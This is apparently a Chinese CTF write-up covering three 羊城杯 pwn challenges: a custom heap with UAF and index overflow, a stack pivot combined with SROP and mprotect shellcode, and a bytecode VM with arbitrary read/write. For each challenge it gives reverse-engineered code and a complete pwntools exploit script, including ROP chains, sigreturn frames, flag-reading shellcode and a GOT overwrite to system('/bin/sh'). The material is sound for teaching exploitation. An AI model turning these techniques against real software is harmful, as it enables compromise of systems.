---
title: "羊城杯 部分"
description: "羊城杯三道 pwn：自建堆的 UAF + 越界拿到任意写、栈迁移接 SROP 打 mprotect、以及一道 VM 题。"
pubDate: 2025-10-13
category: wp
tags: [writeup]
---

## Malloc

### 保护
checksec：保护全开。
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

### 沙箱
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

### 逆向分析
```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char nothing;                      // [rsp+3h] [rbp-Dh] BYREF
  int c;                             // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5;               // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  initstream();
  while ( 1 )
  {
    puts("======MALLOC_MENU======");
    puts("1:creat");
    puts("2:delete");
    puts("3:edit");
    puts("4:show");
    puts("5:exit");
    puts("=======================");
    scanf("%d%c", &c, &nothing);
    switch ( c )
    {
      case 1:
        create();
        break;
      case 2:
        delete();
        break;
      case 3:
        edit();
        break;
      case 4:
        show();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid");
        break;
    }
  }
}

void create()
{
  unsigned int v0;                   // ebx
  char v1;                           // [rsp+Fh] [rbp-21h] BYREF
  unsigned int idx;                  // [rsp+10h] [rbp-20h] BYREF
  unsigned int size;                 // [rsp+14h] [rbp-1Ch] BYREF
  unsigned __int64 v4;               // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  puts("Index");
  scanf("%u%c", &idx, &v1);
  if ( idx <= 0x10 && (puts("size"), scanf("%u%c", &size, &v1), size <= 0x70) && size > 0xF )
  {
    v0 = idx;
    chunk.arr_list[v0] = alloc(size);
    chunk.size_list[idx] = size;
    puts("Success");
  }
  else
  {
    puts("Invalid");
  }
}

chunk_head **__fastcall alloc(unsigned int size)
{
  signed int real_size;              // [rsp+1Ch] [rbp-14h]
  unsigned int low;                  // [rsp+20h] [rbp-10h]
  int line;                          // [rsp+24h] [rbp-Ch]
  chunk_head *v5;                    // [rsp+28h] [rbp-8h]
  chunk_head *ptr;                   // [rsp+28h] [rbp-8h]

  low = size & 0xF;
  if ( low > 8 )
    real_size = size - low + 32;
  else
    real_size = size - low + 16;     // fix size
  line = real_size / 16;
  if ( bins[real_size / 16] )        // bins?
  {
    v5 = bins[line];
    bins[line] = v5->next;
    LOBYTE(v5->pre) = 1;
    return &v5->next;
  }
  else
  {
    if ( real_size >= cap )
    {
      puts("malloc(): corrupted top chunks");
      exit(0);
    }
    ptr = chunk_pointer;
    LOBYTE(chunk_pointer->pre) = 1;  // 上标志位
    ptr->size = real_size;
    chunk_pointer = (chunk_pointer + real_size);// 移动
    cap -= real_size;
    chunk_pointer->size = cap;
    return &ptr->next;
  }
}

void delete()
{
  char v0;                           // [rsp+3h] [rbp-Dh] BYREF
  unsigned int idx;                  // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2;               // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Index");
  scanf("%u%c", &idx, &v0);
  if ( idx <= 0x10 )
  {
    freee(idx);
    chunk.size_list[idx] = 0LL;      // uaf?
    puts("Success");
  }
  else
  {
    puts("Invalid index");
  }
}

void __fastcall freee(int a1)
{
  int size;                          // kr00_4
  int num;                           // [rsp+14h] [rbp-1Ch]
  chunk_head *ptr;                   // [rsp+20h] [rbp-10h]
  chunk_head *header;                // [rsp+28h] [rbp-8h]

  header = (chunk.arr_list[a1] - 16);
  size = header->size;
  *chunk.arr_list[a1] = bins[size / 16];
  bins[size / 16] = header;
  LOBYTE(header->pre) = 0;
  num = 0;
  ptr = bins[size / 16]->next;
  while ( num <= 13 && ptr )
  {
    if ( ptr == header )
    {
      puts("free(): double free or corruption (fast)");
      exit(0);
    }
    ptr = ptr->next;
    ++num;
  }
}

void edit()
{
  char v0;                           // [rsp+Fh] [rbp-11h] BYREF
  unsigned int v1;                   // [rsp+10h] [rbp-10h] BYREF
  unsigned int size;                 // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3;               // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Index");
  scanf("%u%c", &v1, &v0);
  if ( v1 <= 0x10 && chunk.arr_list[v1] && (puts("size"), scanf("%u%c", &size, &v0), size <= chunk.size_list[v1]) )
  {
    read(0, chunk.arr_list[v1], size);
    puts("Success");
  }
  else
  {
    puts("Invalid");
  }
}

unsigned __int64 show()
{
  char v1;                           // [rsp+3h] [rbp-Dh] BYREF
  unsigned int idx;                  // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3;               // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Index");
  scanf("%u%c", &idx, &v1);
  if ( idx <= 0x10 && chunk.arr_list[idx] )
  {
    puts(chunk.arr_list[idx]);
    puts("Success");
  }
  else
  {
    puts("Invalid index");
  }
  return v3 - __readfsqword(0x28u);
}
```
（IDA 里修过类型）大致如上。题目在 `.bss` 上自己模拟了一个堆。

`arr_list` 和 `size_list` 是紧挨着放的两个数组，而 `create()` 的索引检查写的是 `idx <= 0x10`——允许填到第 17 个槽，正好越过 `arr_list` 的边界压到 `size_list[0]` 上。

于是「第 0 个 chunk 的 `size`」和「第 16 个 chunk 的指针」成了同一块内存的前后两半：一次 `create(16, ...)` 就能同时定下一个指针和一个超大的 size，接下来的 `edit(0)` 要多少字节给多少字节，等于无限堆溢出。再配上 `delete()` 之后的 UAF，就有了任意地址读写。

### EXP

思路：先用 UAF 泄露程序基址；再靠堆溢出改 `fd`，把 chunk 申请到 `stdout` 附近泄 libc、到 `environ` 附近泄栈；最后申请到栈上打 ROP。
```python
from pwn import *

context.binary = elf = ELF('./pwn')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

sc = '''brva 0x18C9
'''
io = process(elf.path)
# gdb.attach(io, sc)

def cmd(c: int):
    io.sendlineafter(b'=======================', str(c).encode())

def create(idx: int, size: int):
    cmd(1)
    io.sendlineafter(b'Index', str(idx).encode())
    io.sendlineafter(b'size', str(size).encode())

def free(idx: int):
    cmd(2)
    io.sendlineafter(b'Index', str(idx).encode())

def edit(idx: int, size: int, content: bytes):
    cmd(3)
    io.sendlineafter(b'Index', str(idx).encode())
    io.sendlineafter(b'size', str(size).encode())
    io.send(content)

def show(idx: int):
    cmd(4)
    io.sendlineafter(b'Index', str(idx).encode())

create(0, 0x10)
create(1, 0x10)
create(2, 0x10)
create(3, 0x10)
create(4, 0x10)

free(4)
free(3)
free(2)

show(2)
io.recvline()
pie = u64(io.recvn(6).ljust(8, b'\x00')) - 0x5260
success(f'pie: {hex(pie)}')

create(16, 0x10)

payload = p64(0) * 2
payload += p64(1) + p64(0x20)
payload += p64(0)*2
payload += p64(1) + p64(0x20)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0x20)
payload += p64(pie + 0x40B0)
edit(0, len(payload), payload)

create(5, 0x10)
create(6, 0x10)
show(6)
io.recvline()
libc.address = u64(io.recvn(6).ljust(8, b'\0')) - 0x21b780
success(f'libc: {hex(libc.address)}')

rdi = libc.address + 0x2a3e5
rsi = libc.address + 0x2be51
rdx_r12 = libc.address + 0x904a9
rsp = libc.address + 0x35732
open_addr = libc.sym['open']
read_addr = libc.sym['read']
write_addr = libc.sym['write']
flag = pie + 0x52b8

create(1, 0x30)
create(2, 0x30)
create(3, 0x30)

free(2)
free(1)

payload = b'key~'*(0x90//4)
payload += p64(0) + p64(0x40)
payload += p64(libc.sym['environ']-0x10)
edit(0, len(payload), payload)

create(1, 0x30)
create(2, 0x30)

show(2)
io.recvline()
stack = u64(io.recvn(6).ljust(8, b'\0')) - 0x1a0
success(f'stack: {hex(stack)}')

create(1, 0x70)
create(2, 0x70)

free(2)
free(1)
payload = p64(rdi)
payload += p64(flag)
payload += p64(rsi)
payload += p64(0)
payload += p64(open_addr)
payload += p64(rdi)
payload += p64(3)
payload += p64(rsi)
payload += p64(pie + 0x4100)
payload += p64(rdx_r12)
payload += p64(0x100)
payload += p64(0)
payload += p64(read_addr)
payload += p64(rdi)
payload += p64(1)
payload += p64(rsi)
payload += p64(pie+0x4100)
payload += p64(rdx_r12)
payload += p64(0x100)
payload += p64(0)
payload += p64(write_addr)
payload += b'flag\0\0\0\0'
payload = payload.ljust(0x150,b'a')
payload += p64(0) + p64(0x80)
payload += p64(stack)
edit(0, len(payload), payload)

create(1, 0x70)
create(2, 0x70)

payload = p64(0)*4
payload += p64(rsp)
payload += p64(pie+0x5210)
edit(2, len(payload), payload)

io.interactive()
```

## Stack_Over_Flow

### 保护
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```
没有 canary。

### 沙箱
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
 0005: 0x15 0x09 0x00 0x00000002  if (A == open) goto 0015
 0006: 0x15 0x08 0x00 0x00000003  if (A == close) goto 0015
 0007: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0015
 0008: 0x15 0x06 0x00 0x00000142  if (A == execveat) goto 0015
 0009: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0014
 0010: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0011: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0015
 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0013: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0015: 0x06 0x00 0x00 0x00000000  return KILL
```

### 逆向分析
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  initstream();
  vuln();
  return 0LL;
}

__int64 initstream()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  seed = time(0LL);
  srand(seed);
  for ( i = 0LL; i <= 2; i = rand() % 5 )
    ;
  n_mian = main * i;
  buf = malloc(0x1000uLL);
  sandbox();
  memset(buf, 0, 0x2000uLL);
  buf -= 84;
  buf2 = buf + 0x20;
  buf[0x20] = (buf + 0x200);
  buf2[1] = bye;
  chance = 0LL;
  return 0LL;
}

__int64 vuln()
{
  puts("Welcome to YCB2025!");
  puts("Good luck!");
  read(0, buf, 0x2000uLL);
  if ( chance > 2 )                             // 3 次机会
  {
    puts("Bye~");
    exit(0);
  }
  ++chance;
  return 0LL;
}

__int64 sub_1357()
{
  printf("magic number:%lld\n", n_mian);
  return vuln();
}

signed __int64 bye()
{
  puts("bye~");
  return sys_exit(0);
}
```
同样修过类型：`vuln` 最多溢出 3 次——`chance > 2` 才退出，所以每一次溢出都得算好，不能随便试。

伪代码里看不出栈溢出，因为栈是在汇编里手动切过去的：
```asm
mov     rax, cs:buf2
mov     rbp, rax
mov     rsp, rbp
xor     rax, rax
pop     rbp
retn
```
也就是说，`buf2` 指向的这块内存被当成栈来用，`read` 一写就溢出。

### EXP

思路：先部分覆盖返回地址的低字节，跳到 `sub_1357()` 泄露程序基址；再用 `bye` 里的 syscall 打 SROP，把栈迁到已知地址段，第二次 SROP 调 `mprotect` 给出可执行权限，写 shellcode 再跳过去。
```python
from pwn import *

context.binary = elf = ELF('./xxxxx')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

scc = asm('''
    lea rsi, [rip]
    add rsi, 0x3a
    xor rdx, rdx
    xor rcx, rcx
    mov rdi, 0xffffff9c
    mov rax, 0x101
    syscall

    mov rsi, rax
    mov rdi, 1
    xor rdx, rdx
    mov r10, 0x50
    mov rax, 40
    syscall
               ''')

libc = ELF('./libc.so.6')

sc = '''brva 0x16A3
'''
io = process(elf.path)
# gdb.attach(io, sc)

payload = b'a'*0x100
payload += b'b'*8
payload += p8(0x5F)

# pause()
io.send(payload)

io.recvuntil(b'magic number:')
n_main = int(io.recvline().strip())
log.success('n_main: ' + hex(n_main))
x = n_main//4
log.success('n_main: ' + hex(x))
y = n_main//3
log.success('n_main: ' + hex(y))
main_addr = y if y & 0xfff == 0x6B0 else x

log.success('main_addr: ' + hex(main_addr))

pie = main_addr - 0x16B0
log.success('pie: ' + hex(pie))

syscall_pop_ret = pie + 0x134F
cls_rax_pop_ret = pie + 0x16CC
ret = pie + 0x16D5

s = SigreturnFrame()
s.rdi = 0
s.rsi = pie + 0x4800
s.rdx = 0x300
s.rsp = pie + 0x4800
s.rip = syscall_pop_ret
s.rax = 0

payload = b'a'*0x108
payload += p64(cls_rax_pop_ret)
payload += p64(0x3C)
payload += p64(syscall_pop_ret)
payload += p64(0)
payload += p64(syscall_pop_ret)
payload += bytes(s)

pause()
io.send(payload)

pause()
io.sendline(b'a'*0xe)

s1 = SigreturnFrame()
s1.rdi = pie
s1.rsi = 0x7000
s1.rdx = 7
s1.rsp = pie + 0x4950
s1.rip = syscall_pop_ret
s1.rax = 10

payload = b'./flag\x00\x00'
payload += p64(cls_rax_pop_ret)
payload += p64(0x3C)
payload += p64(syscall_pop_ret)
payload += p64(0)
payload += p64(syscall_pop_ret)
payload += bytes(s1)
payload += p64(0)
payload += p64(cls_rax_pop_ret)
payload += p64(0x3C)
payload += p64(syscall_pop_ret)
payload += p64(0)
payload += p64(pie + 0x4800)
payload += p64(pie + 0x4960)
payload += scc
payload += b'/flag\x00'

pause()
io.send(payload)

pause()
io.send(b'a'*0xf)

io.interactive()
```

## Vm

### 保护
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```
这题保护最少。

### 沙箱

这题没有沙箱。

### 逆向分析
```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  vm *vm;                          // [rsp+8h] [rbp-8h]

  init();
  vm = malloc(0x50uLL);
  memset(vm, 0, sizeof(vm));
  puts("Please input your opcodes:");
  vm->code = &buf;
  read(0, &buf, 0x800uLL);
  vm->ip = 0;
  vm->x = 0x1000LL;
  run(vm);
}

void init()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}

void __fastcall __noreturn run(vm *vm)
{
  int c;                           // eax
  x *s;                            // [rsp+18h] [rbp-8h]

  s = malloc(0xCuLL);
  memset(s, 0, 8uLL);
  do
  {
    if ( getoptype(vm, s) == -1 )
      break;
    c = s->t & 3;
    if ( c == 3 )
    {
      op3(vm, s);
    }
    else if ( (s->t & 3u) <= 3 )
    {
      if ( c == 2 )
      {
        op2(vm, s);
      }
      else if ( (s->t & 3) != 0 )
      {
        op1(vm, s);
      }
      else
      {
        op0(vm, s);
      }
    }
    memset(s, 0, sizeof(x));
    if ( vm->x > 4096 )
      break;
  }
  while ( vm->ip <= 0x800u );
  puts("Segment error");
  _exit(0);
}

__int64 __fastcall getoptype(vm *vm, x *s)
{
  char *code;                      // rsi
  unsigned int ip;                 // eax
  int type;                        // eax
  char *v5;                        // rsi
  unsigned int v6;                 // eax
  char *v7;                        // rsi
  unsigned int v8;                 // eax
  __int64 result;                  // rax
  char *v10;                       // rsi
  unsigned int v11;                // eax
  char *v12;                       // rsi
  unsigned int v13;                // eax
  char *code3;                     // rsi
  unsigned int ip3;                // eax
  unsigned __int8 v17;             // [rsp+17h] [rbp-9h]
  unsigned int i;                  // [rsp+18h] [rbp-8h]

  code = vm->code;
  ip = vm->ip;
  vm->ip = ip + 1;
  s->t = code[ip];
  s->type = s->t & 3;
  type = s->type;
  if ( type == 3 )
  {
    code3 = vm->code;
    ip3 = vm->ip;
    vm->ip = ip3 + 1;
    s->codeval = code3[ip3];
    if ( g6(s->codeval) )
      return 0xFFFFFFFFLL;
    s->codeval2 = *&vm->code[vm->ip];
    vm->ip += 4;
  }
  else if ( s->type <= 3u )
  {
    if ( type == 2 )
    {
      v10 = vm->code;
      v11 = vm->ip;
      vm->ip = v11 + 1;
      s->codeval = v10[v11];
      v12 = vm->code;
      v13 = vm->ip;
      vm->ip = v13 + 1;
      s->codeval2 = v12[v13];
      if ( g6(s->codeval) && g6(s->codeval2) )
        return 0xFFFFFFFFLL;
    }
    else if ( s->type )
    {
      v7 = vm->code;
      v8 = vm->ip;
      vm->ip = v8 + 1;
      v17 = v7[v8];
      if ( g6(v17) )
        return 0xFFFFFFFFLL;
      s->codeval = v17;
    }
    else
    {
      for ( i = 0; i <= 2; ++i )
      {
        s->codeval <<= 8;
        v5 = vm->code;
        v6 = vm->ip;
        vm->ip = v6 + 1;
        s->codeval |= v5[v6];
      }
    }
  }
  result = s->t;
  if ( !result )
    return 0xFFFFFFFFLL;
  return result;
}

void __fastcall op0(vm *vm, x *s)
{
  int v2;                          // edx
  int v3;                          // edx

  switch ( s->t >> 2 )
  {
    case '$':
      vm->x -= 4 * s->codeval;
      return;
    case '%':
      vm->x += 4 * s->codeval;
      return;
    case ')':
      goto LABEL_4;
    case '*':
      goto LABEL_8;
    case '+':
      if ( LOBYTE(vm->y) == 2 )
        goto LABEL_4;
      return;
    case ',':
      if ( LOBYTE(vm->y) == 1 )
        goto LABEL_4;
      return;
    case '-':
      if ( LOBYTE(vm->y) == 2 )
        goto LABEL_4;
      goto LABEL_8;
    case '.':
      if ( LOBYTE(vm->y) == 1 )
        goto LABEL_4;
LABEL_8:
      if ( !LOBYTE(vm->y) )
        goto LABEL_4;
      return;
    case '/':
      if ( LOBYTE(vm->y) )
      {
LABEL_4:
        if ( (s->codeval & 0x800000) != 0 )
          v2 = vm->ip - (s->codeval & 0x7FFFFF);
        else
          v2 = (s->codeval & 0x7FFFFF) + vm->ip;
        vm->ip = v2;
      }
      return;
    case '0':
      vm->x -= 4LL;
      *&vm->code[vm->x] = vm->ip;
      if ( (s->codeval & 0x800000) != 0 )
        v3 = vm->ip - (s->codeval & 0x7FFFFF);
      else
        v3 = (s->codeval & 0x7FFFFF) + vm->ip;
      vm->ip = v3;
      return;
    case '3':
      rw(s->codeval, vm->regs[0], vm->regs[1], vm->regs[2]);
      goto LABEL_25;
    case '4':
      if ( g0x1000(vm->regs[0]) )
        goto LABEL_27;
      rw(s->codeval, LODWORD(vm->code) + LODWORD(vm->regs[0]), vm->regs[1], vm->regs[2]);
      goto LABEL_25;
    case '5':
      if ( g0x1000(vm->regs[1]) )
        goto LABEL_27;
      rw(s->codeval, vm->regs[0], &vm->code[vm->regs[1]], vm->regs[2]);
      goto LABEL_25;
    case '6':
      if ( g0x1000(vm->regs[2]) )
        goto LABEL_27;
      rw(s->codeval, vm->regs[0], vm->regs[1], &vm->code[vm->regs[2]]);
      goto LABEL_25;
    case '7':
      if ( g0x1000(vm->regs[0]) || g0x1000(vm->regs[1]) )
        goto LABEL_27;
      rw(s->codeval, LODWORD(vm->code) + LODWORD(vm->regs[0]), &vm->code[vm->regs[1]], vm->regs[2]);
      goto LABEL_25;
    case '8':
      if ( g0x1000(vm->regs[0]) || g0x1000(vm->regs[2]) )
        goto LABEL_27;
      rw(s->codeval, LODWORD(vm->code) + LODWORD(vm->regs[0]), vm->regs[1], &vm->code[vm->regs[2]]);
      goto LABEL_25;
    case '9':
      if ( g0x1000(vm->regs[1]) || g0x1000(vm->regs[2]) )
        goto LABEL_27;
      rw(s->codeval, vm->regs[0], &vm->code[vm->regs[1]], &vm->code[vm->regs[2]]);
      goto LABEL_25;
    case ':':
      if ( g0x1000(vm->regs[0]) || g0x1000(vm->regs[1]) || g0x1000(vm->regs[2]) )
LABEL_27:
        out();
      rw(s->codeval, LODWORD(vm->code) + LODWORD(vm->regs[0]), &vm->code[vm->regs[1]], &vm->code[vm->regs[2]]);
LABEL_25:
      LODWORD(vm->regs[0]) = vm + 16;
      break;
    case ';':
      vm->ip = *&vm->code[vm->x];
      vm->x += 4 * (s->codeval + 1);
      break;
    default:
      return;
  }
}

void __fastcall op1(vm *vm, x *s)
{
  switch ( s->t >> 2 )
  {
    case 31:
      vm->x -= 4LL;
      *&vm->code[vm->x] = vm->regs[s->codeval];
      return;
    case 32:
      vm->regs[s->codeval] = *&vm->code[vm->x];
      vm->x += 4LL;
      return;
    case 33:
      ++vm->regs[s->codeval];
      return;
    case 34:
      --vm->regs[s->codeval];
      return;
    case 35:
      vm->regs[s->codeval] = vm->x;
      return;
    case 41:
      goto LABEL_7;
    case 42:
      goto LABEL_8;
    case 43:
      if ( LOBYTE(vm->y) == 2 )
        goto LABEL_7;
      return;
    case 44:
      if ( LOBYTE(vm->y) == 1 )
        goto LABEL_7;
      return;
    case 45:
      if ( LOBYTE(vm->y) == 2 )
        goto LABEL_7;
      goto LABEL_8;
    case 46:
      if ( LOBYTE(vm->y) == 1 )
        goto LABEL_7;
LABEL_8:
      if ( !LOBYTE(vm->y) )
        goto LABEL_7;
      return;
    case 47:
      if ( LOBYTE(vm->y) )
LABEL_7:
        vm->ip = vm->regs[s->codeval];
      break;
    case 48:
      vm->x -= 4LL;
      *&vm->code[vm->x] = vm->ip;
      vm->ip = s->codeval;
      break;
    default:
      return;
  }
}

void __fastcall op2(vm *vm, x *s)
{
  unsigned int v2;                 // [rsp+1Ch] [rbp-4h]

  switch ( s->t >> 2 )
  {
    case 1:
      if ( vm->regs[s->codeval] <= vm->regs[s->codeval2] )
        LOBYTE(vm->y) = vm->regs[s->codeval] < vm->regs[s->codeval2];
      else
        LOBYTE(vm->y) = 2;
      break;
    case 2:
      if ( vm->regs[s->codeval] <= vm->regs[s->codeval2] )
        LOBYTE(vm->y) = vm->regs[s->codeval] < vm->regs[s->codeval2];
      else
        LOBYTE(vm->y) = 2;
      break;
    case 3:
      vm->regs[s->codeval] = vm->regs[s->codeval2];
      break;
    case 4:
      vm->regs[s->codeval] ^= vm->regs[s->codeval2];
      break;
    case 5:
      vm->regs[s->codeval] |= vm->regs[s->codeval2];
      break;
    case 6:
      vm->regs[s->codeval] &= vm->regs[s->codeval2];
      break;
    case 7:
      vm->regs[s->codeval] <<= vm->regs[s->codeval2];
      break;
    case 8:
      vm->regs[s->codeval] = vm->regs[s->codeval] >> vm->regs[s->codeval2];
      break;
    case 9:
      v2 = vm->regs[s->codeval];
      vm->regs[s->codeval] = vm->regs[s->codeval2];
      vm->regs[s->codeval2] = v2;
      break;
    case 10:
      vm->regs[s->codeval] += vm->regs[s->codeval2];
      break;
    case 11:
      vm->regs[s->codeval] -= vm->regs[s->codeval2];
      break;
    case 12:
      if ( g0x1000(vm->regs[s->codeval2]) )
        out();
      vm->regs[s->codeval] = vm->code[vm->regs[s->codeval2]];
      break;
    case 13:
      if ( g0x1000(vm->regs[s->codeval2]) )
        out();
      vm->regs[s->codeval] = *&vm->code[vm->regs[s->codeval2]];
      break;
    case 14:
      if ( g0x1000(vm->regs[s->codeval2]) )
        out();
      vm->regs[s->codeval] = *&vm->code[vm->regs[s->codeval2]];
      break;
    case 15:
      if ( g0x1000(vm->regs[s->codeval2]) )
        out();
      vm->code[vm->regs[s->codeval2]] = vm->regs[s->codeval];
      break;
    case 16:
      if ( g0x1000(vm->regs[s->codeval2]) )
        out();
      *&vm->code[vm->regs[s->codeval2]] = vm->regs[s->codeval];
      break;
    case 17:
      if ( g0x1000(vm->regs[s->codeval2]) )
        out();
      *&vm->code[vm->regs[s->codeval2]] = vm->regs[s->codeval];
      break;
    default:
      return;
  }
}

void __fastcall op3(vm *vm, x *s)
{
  switch ( s->t >> 2 )
  {
    case 1:
      if ( vm->regs[s->codeval] <= s->codeval2 )
        LOBYTE(vm->y) = vm->regs[s->codeval] < s->codeval2;
      else
        LOBYTE(vm->y) = 2;
      break;
    case 2:
      if ( vm->regs[s->codeval] <= s->codeval2 )
        LOBYTE(vm->y) = vm->regs[s->codeval] < s->codeval2;
      else
        LOBYTE(vm->y) = 2;
      break;
    case 3:
      vm->regs[s->codeval] = s->codeval2;
      break;
    case 4:
      vm->regs[s->codeval] ^= s->codeval2;
      break;
    case 5:
      vm->regs[s->codeval] |= s->codeval2;
      break;
    case 6:
      vm->regs[s->codeval] &= s->codeval2;
      break;
    case 7:
      vm->regs[s->codeval] <<= s->codeval2;
      break;
    case 8:
      vm->regs[s->codeval] = vm->regs[s->codeval] >> s->codeval2;
      break;
    case 10:
      vm->regs[s->codeval] += s->codeval2;
      break;
    case 11:
      vm->regs[s->codeval] -= s->codeval2;
      break;
    case 12:
      if ( g0x1000(s->codeval2) )  // byte
        out();
      vm->regs[s->codeval] = vm->code[s->codeval2];
      break;
    case 13:                       // word
      if ( g0x1000(s->codeval2) )
        out();
      vm->regs[s->codeval] = *&vm->code[s->codeval2];
      break;
    case 14:                       // dword
      if ( g0x1000(s->codeval2) )
        out();
      vm->regs[s->codeval] = *&vm->code[s->codeval2];
      break;
    case 15:
      if ( g0x1000(vm->regs[s->codeval]) )
        out();
      vm->code[vm->regs[s->codeval]] = s->codeval2;
      break;
    case 16:
      if ( g0x1000(vm->regs[s->codeval]) )
        out();
      *&vm->code[vm->regs[s->codeval]] = s->codeval2;
      break;
    case 17:
      if ( g0x1000(vm->regs[s->codeval]) )
        out();
      *&vm->code[vm->regs[s->codeval]] = s->codeval2;
      break;
    default:
      return;
  }
}

__int64 __fastcall rw(int sysnum, int a2, void *a3, size_t a4)
{
  if ( sysnum == 2 )
    _exit(a2);
  if ( sysnum > 2 )
    return 0;
  if ( sysnum )
  {
    if ( sysnum != 1 )
      return 0;
    return write(a2, a3, a4);
  }
  else
  {
    return read(a2, a3, a4);
  }
}

_BOOL8 __fastcall g6(unsigned int val)
{
  return val > 6;
}

_BOOL8 __fastcall sub_401215(unsigned __int64 a1)
{
  return a1 > 0x1000;
}

void __noreturn sub_401239()
{
  puts("Insecurity");
  _exit(0);
}
```
VM 题的逆向最费劲。结构上是个很标准的字节码解释器：每个 opcode 的首字节低两位决定走 `op0` / `op1` / `op2` / `op3`，高六位是具体操作。

弱点在 `op0` 里 `'3'` 到 `':'` 那几支——它们最后都调到 `rw()`，而 `rw()` 的第一个参数是系统调用号（0 读、1 写、2 退出）。也就是说，字节码可以直接对任意地址发起 read / write，这就是后面所有利用的基础。

### EXP

思路：读 GOT 表泄 libc，再把 GOT 改掉。
```python
from pwn import *

context.binary = elf = ELF('./vvmm')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

sc = '''b *0x401775
'''
io = process(elf.path)
# gdb.attach(io, sc)

code = b''

def op0(c:int,x:int,y:int,z:int):
    global code
    c = c << 2
    code += p8(c|0)
    code += p8(x)
    code += p8(y)
    code += p8(z)

def op3(c:int,x:int,y:int):
    global code
    c = c << 2
    code += p8(c|3)
    code += p8(x)
    code += p32(y)

def set_reg(idx:int,val:int):
    op3(3,idx,val)

def read_mem(addr:int):
    set_reg(2,0x100)
    set_reg(1,addr)
    set_reg(0,0)
    op0(0x33,0,0,0)

def write_mem(addr:int):
    set_reg(2,0x100)
    set_reg(1,addr)
    set_reg(0,1)
    op0(0x33,0,0,1)

def system_123():
    set_reg(0, 0x4050A0)
    op0(0x33,0,0,1)

write_mem(0x405020)
read_mem(0x405028)
read_mem(0x4050A0)
system_123()

io.recvline()
io.sendline(code)
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']

io.send(p64(system))

pause()
io.sendline(b'/bin/sh\x00')

io.interactive()
```
